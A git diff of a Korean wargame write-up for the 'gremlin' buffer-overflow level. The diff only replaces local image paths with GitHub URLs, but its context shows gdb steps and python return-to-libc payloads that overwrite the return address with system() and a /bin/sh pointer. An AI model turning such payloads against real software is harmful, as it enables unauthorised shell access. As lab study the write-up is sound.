@@ -5,7 +5,7 @@
 - tmp 디렉터리로 가서 gdb로 gremlin을 본다.
 - system 함수와 /bin/sh의 주소만 알면된다.
 
-![1568134864528](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134864528.png)
+![1568134864528](https://user-images.githubusercontent.com/52530785/64917451-90d93e00-d7cb-11e9-8fff-dd5d364d7fec.png)
 
 main 함수에 breakpoint를 걸고 실행 후, system의 주소를 출력한다.
 
@@ -15,7 +15,7 @@ r
 p system
 ```
 
-![1568133491885](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568133491885.png)
+![1568133491885](https://user-images.githubusercontent.com/52530785/64917466-933b9800-d7cb-11e9-899e-35f219492cf7.png)
 
 
 
@@ -25,13 +25,13 @@ libc가 보인다.(libc는 무조건 있다.) 이 안에는 system이 있고, sy
 
 우리는 이 system 함수 주소와 /bin/sh 의 주소를 사용하면 된다.
 
-![1568133593933](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568133593933.png)
+![1568133593933](https://user-images.githubusercontent.com/52530785/64917467-933b9800-d7cb-11e9-8714-7a558d067d88.png)
 
 
 
 쭉 찾아보는데 잘 보이지 않으므로, 환경변수에 추가했다.
 
-![1568133643992](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568133643992.png)
+![1568133643992](https://user-images.githubusercontent.com/52530785/64917468-933b9800-d7cb-11e9-8898-f8f29530b574.png)
 
 
 
@@ -45,15 +45,15 @@ ni
 x/2ws $ebp
 ```
 
-![1568133876050](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568133876050.png)
+![1568133876050](https://user-images.githubusercontent.com/52530785/64917469-933b9800-d7cb-11e9-96df-9414d119c853.png)
 
-![1568133895079](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568133895079.png)
+![1568133895079](https://user-images.githubusercontent.com/52530785/64917470-93d42e80-d7cb-11e9-810a-1fb4ac172688.png)
 
 
 
 - 이 중 x/2ws $ebp 명령어를 통해 나오는 값들은 
 
-![1568134829679](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134829679.png)
+![1568134829679](https://user-images.githubusercontent.com/52530785/64917450-90d93e00-d7cb-11e9-945c-6ff9cd344bf9.png)
 
 이렇게 이다.
 
@@ -65,7 +65,7 @@ env의 값들을 보면
 x/10wx 0xbffffb70
 ```
 
-![1568134224079](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134224079.png)
+![1568134224079](https://user-images.githubusercontent.com/52530785/64917471-93d42e80-d7cb-11e9-8cb4-18a05c30d47d.png)
 
 이렇게 쭉 있는데 그 중 첫번째부터 쭉 보았다.
 
@@ -75,7 +75,7 @@ x/10wx 0xbffffb70
 x/100s 0xbffffc71
 ```
 
-![1568134351208](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134351208.png)
+![1568134351208](https://user-images.githubusercontent.com/52530785/64917472-93d42e80-d7cb-11e9-8af4-c0dbf4a0914a.png)
 
 0xbffffc84에 내가 환경변수에 추가한 BINSH=/bin/sh 가 있다.
 
@@ -85,7 +85,7 @@ x/100s 0xbffffc71
 x/s 0xbffffc84
 ```
 
-![1568134418033](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134418033.png)
+![1568134418033](https://user-images.githubusercontent.com/52530785/64917473-946cc500-d7cb-11e9-80e8-c9ea185b4822.png)
 
 
 
@@ -93,7 +93,7 @@ x/s 0xbffffc84
 
 BINSH= 의 6바이트만큼 더해서 /bin/sh만 나타낸다.
 
-![1568134471342](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134471342.png)
+![1568134471342](https://user-images.githubusercontent.com/52530785/64917474-946cc500-d7cb-11e9-8a8c-1437038ef845.png)
 
 
 
@@ -101,11 +101,11 @@ BINSH= 의 6바이트만큼 더해서 /bin/sh만 나타낸다.
 
 그러면 지금 system 함수의 주소인 0x40058ae0과
 
-![1568134540288](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134540288.png)
+![1568134540288](https://user-images.githubusercontent.com/52530785/64917449-90d93e00-d7cb-11e9-966e-57dc842a72ba.png)
 
 /bin/sh의 주소인 0xbffffc84+6 을 구했다.
 
-![1568134471342](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568134471342.png)
+![1568134471342-1568528020936](https://user-images.githubusercontent.com/52530785/64917448-90d93e00-d7cb-11e9-89d3-c9383e137739.png)
 
 0xbffffc8a
 
@@ -113,7 +113,7 @@ BINSH= 의 6바이트만큼 더해서 /bin/sh만 나타낸다.
 
 그럼 gremlin.c 는
 
-![1568135017123](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568135017123.png)
+![1568135017123](https://user-images.githubusercontent.com/52530785/64917452-9171d480-d7cb-11e9-85ea-6de371ff3fd8.png)
 
 이므로
 
@@ -139,7 +139,7 @@ system 함수 주소 : 0x40058ae0
 ./gremlin `python -c 'print "a"*260+"\xe0\x8a\x05\x40"+"\x61\x61\x61\x61"+"\x8a\xfc\xff\xbf"'`
 ```
 
-![1568136000398](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136000398.png)
+![1568136000398](https://user-images.githubusercontent.com/52530785/64917453-9171d480-d7cb-11e9-985a-fb24185d009e.png)
 
 segmentation fault 가 뜬다.
 
@@ -155,9 +155,9 @@ si	// 기본 gdb가 이상해서 main에서 ni를 하면 main이 끝나므로 si
 dias main
 ```
 
-![1568136057091](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136057091.png)
+![1568136057091](https://user-images.githubusercontent.com/52530785/64917454-9171d480-d7cb-11e9-9d78-1b6d457da59c.png)
 
-![1568136077828](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136077828.png)
+![1568136077828](https://user-images.githubusercontent.com/52530785/64917455-9171d480-d7cb-11e9-90d4-cfdf5f81c1d0.png)
 
 
 
@@ -165,7 +165,7 @@ dias main
 disas main	에서 ret의 주소에 breakpoint 를 건다.
 ```
 
-![1568136287130](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136287130.png)
+![1568136287130](https://user-images.githubusercontent.com/52530785/64917457-920a6b00-d7cb-11e9-9235-75af6c242078.png)
 
 
 
@@ -173,7 +173,7 @@ disas main	에서 ret의 주소에 breakpoint 를 건다.
 c  //continue 하면 진행된다.
 ```
 
-![1568136305429](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136305429.png)
+![1568136305429](https://user-images.githubusercontent.com/52530785/64917458-920a6b00-d7cb-11e9-9363-177fe8a36741.png)
 
 
 
@@ -183,13 +183,13 @@ c  //continue 하면 진행된다.
 x/wx $esp	//system의 주소와 똑같다.
 ```
 
-![1568136410468](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136410468.png)
+![1568136410468](https://user-images.githubusercontent.com/52530785/64917459-920a6b00-d7cb-11e9-8f0a-9de5e66ffaa3.png)
 
 
 
 엔터를 계속 치면서 보면
 
-![1568136493255](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136493255.png)
+![1568136493255](https://user-images.githubusercontent.com/52530785/64917460-920a6b00-d7cb-11e9-9dde-1daa1fc62da6.png)
 
 
 
@@ -228,7 +228,7 @@ x/wx $esp
 x/s 0xbffffc8a	--> /bin/sh 문자열의 주소
 ```
 
-![1568136774197](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136774197.png)
+![1568136774197](https://user-images.githubusercontent.com/52530785/64917461-92a30180-d7cb-11e9-8421-1035bcd972de.png)
 
 
 
@@ -240,7 +240,7 @@ x/s 0xbffffc8a	--> /bin/sh 문자열의 주소
 x/s 0xbffffc8a-0x100	명령어를 사용했다.
 ```
 
-![1568136992992](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568136992992.png)
+![1568136992992](https://user-images.githubusercontent.com/52530785/64917462-92a30180-d7cb-11e9-9336-5ceda1b3d53d.png)
 
 
 
@@ -254,7 +254,7 @@ BINSH=/bin/sh 가 0xbffffc73 에 있다.
 
 /bin/sh 문자열의 주소를 바꿔서 하면
 
-![1568137087557](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568137087557.png)
+![1568137087557](https://user-images.githubusercontent.com/52530785/64917463-92a30180-d7cb-11e9-8486-5277b16c9cd8.png)
 
 /sh를 찾을 수 없다고 나온다.
 
@@ -268,7 +268,7 @@ BINSH=/bin/sh 가 0xbffffc73 에 있다.
 ./gremlin `python -c 'print "a"*260+"\xe0\x8a\x05\x40\x61\x61\x61\x61"+"\x75\xfc\xff\xbf"'`
 ```
 
-![1568137174300](C:\Users\Jaewan.DESKTOP-TRD27GL\AppData\Roaming\Typora\typora-user-images\1568137174300.png)
+![1568137174300](https://user-images.githubusercontent.com/52530785/64917465-92a30180-d7cb-11e9-99f8-0a722ca95001.png)
 
 
 
